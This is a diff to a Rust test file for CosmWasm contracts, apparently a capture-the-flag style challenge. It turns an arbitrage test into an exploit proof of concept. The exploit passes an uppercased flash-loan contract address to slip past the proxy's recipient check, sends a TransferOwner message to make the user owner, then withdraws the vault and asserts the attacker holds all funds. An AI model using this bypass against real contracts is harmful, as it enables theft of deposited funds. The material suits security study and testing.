@@ -122,9 +122,9 @@ pub mod tests {
         let (mut app, proxy_contract, flash_loan_contract, mock_arb_contract) =
             proper_instantiate();
 
-        // prepare arb msg
-        let arb_msg = to_binary(&MockArbExecuteMsg::Arbitrage {
-            recipient: flash_loan_contract.clone(),
+        // prepare exploit msg
+        let exploit_msg = to_binary(&FlashLoanExecuteMsg::TransferOwner {
+            new_owner: Addr::unchecked(USER),
         })
         .unwrap();
 
@@ -134,19 +134,19 @@ pub mod tests {
             proxy_contract.clone(),
             &ExecuteMsg::RequestFlashLoan {
                 recipient: flash_loan_contract.clone(),
-                msg: arb_msg.clone(),
+                msg: exploit_msg.clone(),
             },
             &[],
         )
         .unwrap_err();
 
-        // try perform flash loan
+        // try perform flash loan exploit with an uppercased flash loan address
         app.execute_contract(
             Addr::unchecked(ADMIN),
             proxy_contract,
             &ExecuteMsg::RequestFlashLoan {
-                recipient: mock_arb_contract,
-                msg: arb_msg,
+                recipient: Addr::unchecked(flash_loan_contract.to_string().to_uppercase()),
+                msg: exploit_msg,
             },
             &[],
         )
@@ -157,6 +157,31 @@ pub mod tests {
             .wrap()
             .query_balance(flash_loan_contract.to_string(), DENOM)
             .unwrap();
+        assert_eq!(balance.amount, Uint128::new(10_000));
+
+        // drain vault
+        app.execute_contract(
+            Addr::unchecked(USER),
+            flash_loan_contract.clone(),
+            &FlashLoanExecuteMsg::WithdrawFunds {
+                recipient: Addr::unchecked(USER),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // vault is drained
+        let balance = app
+        .wrap()
+        .query_balance(flash_loan_contract.to_string(), DENOM)
+        .unwrap();
+        assert_eq!(balance.amount, Uint128::zero());
+
+        // attacker holds funds
+        let balance = app
+        .wrap()
+        .query_balance(String::from(USER), DENOM)
+        .unwrap();
         assert_eq!(balance.amount, Uint128::new(10_000));
     }
 }
